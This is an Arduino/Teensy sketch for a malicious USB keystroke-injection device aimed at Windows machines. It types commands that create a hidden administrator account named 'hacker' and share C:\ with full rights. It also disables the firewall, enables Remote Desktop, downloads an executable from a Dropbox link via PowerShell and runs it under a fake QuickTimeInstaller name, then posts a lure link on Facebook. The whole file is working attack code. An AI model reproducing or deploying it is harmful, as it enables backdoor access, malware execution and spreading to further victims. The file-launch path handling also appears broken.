int ledPin=13;
	
char *link = "https://dl.dropboxusercontent.com/s/mx2i6efbqg11gu2/payload.exe?dl=0";
char *location = "C:/Users/QuickTimeInstaller.exe";
char *uname = "hacker"; 
char *pwd = "pass";

void setup()
{             
	pinMode(ledPin, OUTPUT);    
	delay(1000); 
	  
	wait_for_drivers(2000);
	delay(1000);
	  
	secure_prompt();
	delay(1000);

	add_user(uname, pwd);  
	delay(1000);
	  
	disable_firewall_enable_RDP();
	delay(1000);
   
        malicious_file_download_powershell(link, location);
        delay(1000);
        
        open_malicious_file(location);
        delay(5000);
       
	facebookPost();
	delay(2000);
}

void loop()                     
{

}

void wait_for_drivers(unsigned int speed)
{
	bool numLockTrap = is_num_on();
	while(numLockTrap == is_num_on())
	{
		press_numlock();
		releaseKeys();
		delay(speed);
	}
	press_numlock();
	releaseKeys();
	delay(speed);
}

// Checking for numlock 
int ledkeys(void) {return int(keyboard_leds);}
bool is_num_on(void) {return ((ledkeys() & 1) == 1) ? true : false;}

//press numlock without release
void press_numlock(void)
{
	Keyboard.set_key1(KEY_NUM_LOCK);
	Keyboard.send_now();
	delay(200);
}

void make_sure_numlock_is_off(void)
{
	if (is_num_on())
	{
		delay(500);
		press_numlock();
		delay(700);
		releaseKeys();
		delay(700);
	}
}

void PressAndRelease(int Key,int Count)
{
	  int KeyCounter=0;
	  for (KeyCounter=0;  KeyCounter!=Count; KeyCounter++)
	  {
		  Keyboard.set_key1(Key); // use r key
		  Keyboard.send_now(); // send strokes
		  releaseKeys();
	  }
}

void releaseKeys()
{
	  delay(200);
	  Keyboard.set_key1(0); 
	  Keyboard.set_modifier(0);
	  Keyboard.send_now(); 
	  
}

void secure_prompt()
{
	delay(700);
	Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
	Keyboard.send_now();
	releaseKeys();
	delay(2000);
	Keyboard.print("cmd");
	delay(500);
	Keyboard.set_modifier(MODIFIERKEY_CTRL);
	Keyboard.send_now();
	Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
	Keyboard.send_now();
	Keyboard.set_key1(KEY_ENTER);
	Keyboard.send_now();
	delay(400);
	releaseKeys();
	delay(3000);

}

void facebookPost()
{
	secure_prompt();
        delay(2000);
        
	Keyboard.println("start http://m.facebook.com");
	delay(8000);
	PressAndRelease(KEY_TAB, 8);
	delay(2000);
	Keyboard.print("Check out this great <a href=\"192.168.111.131\">website</a> where you can learn Java for free!");
	delay(1000);
	Keyboard.set_modifier(MODIFIERKEY_SHIFT);
	Keyboard.set_key1(KEY_TAB);
	Keyboard.send_now();
	releaseKeys();
	PressAndRelease(KEY_ENTER, 1); 
	delay(400);
}

//Adds a new hidden user to the local machine with admin priviliges
void add_user(char *uname, char *pwd)
{
	//Create a new user
	Keyboard.print("net user ");
	Keyboard.print(uname);
	Keyboard.print(" ");
	Keyboard.print(pwd);
	Keyboard.println(" /add");
	delay(300);
		
	//Sets the newly created user to be a local administrative account
	Keyboard.print("net localgroup administrators ");
	Keyboard.print(uname);
	Keyboard.println(" /add");
	delay(300);

	//Hides the new user account
	Keyboard.print("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v ");
	Keyboard.print(uname);
	Keyboard.println(" /d 0 /t REG_DWORD /f");
	delay(300);
	Keyboard.println("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" /v dontdisplaylastusername /t REG_DWORD /d 1 /f");
	delay(300);

	//Share C:\ with this new account
	Keyboard.print("net share root=C:\ /grant:"); //grant
	Keyboard.print(uname); //the user
	Keyboard.println(F",FULL"); // full privileges
	delay(300);
}

//Disables Windows firewall and enable remote desktop
//HR: http://www.windows-commandline.com/enable-remote-desktop-command-line/
void disable_firewall_enable_RDP()
{
	//Disables Windows firewall
	Keyboard.println("netsh firewall set opmode disable");
	delay(3000);
	//Enable Remote Desktop
	Keyboard.println("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
	delay(500);
        //Enable Remote Assistance
	Keyboard.println("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f");
	delay(500);
	//Configure Terminal Services to be started up automatically
	Keyboard.println("reg add \"HKLM\\System\\CurrentControlSet\\Services\\TermService\" /v Start /t REG_DWORD /d 2 /f");
	delay(500);
	//Start Terminal Services
	Keyboard.println("sc start termservice");
	delay(3000);
        //Open TCP port 3389 on the firewall for Remote Desktop Connection
	Keyboard.println("netsh add portopening TCP 3389 \"Remote Desktop\"");
	delay(1000);
}

//HR: http://www.thomasmaurer.ch/2010/10/how-to-download-files-with-powershell/
void malicious_file_download_powershell(char *link,char *location)
{
        //Start powershell
	Keyboard.println("powershell");
	delay(3000);
        
        //Set a variable called "url" to specify the download link
	Keyboard.print("$url = \"");
	Keyboard.print(link);
	Keyboard.println("\"");

        //Set a variable called "path" to specify the download location and file name
	Keyboard.print("$path = \"");
	Keyboard.print(location);
	Keyboard.println("\"");

        //Start WebClient
        Keyboard.println("$webclient = New-Object System.Net.WebClient");

	//Begin download
        Keyboard.println("$webclient.DownloadFile($url,$path);");
	delay(1000);

        Keyboard.println("exit"); 
}

void open_malicious_file(char *location)
{
        Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); //Windows key
        Keyboard.set_key1(KEY_R); // use r key
        Keyboard.send_now();
        delay(500);
        releaseKeys();
        delay(2000);
	Keyboard.print("cmd /c C:/Users/");
	Keyboard.print(location);
	Keyboard.println(".exe");
	delay(5000);
}
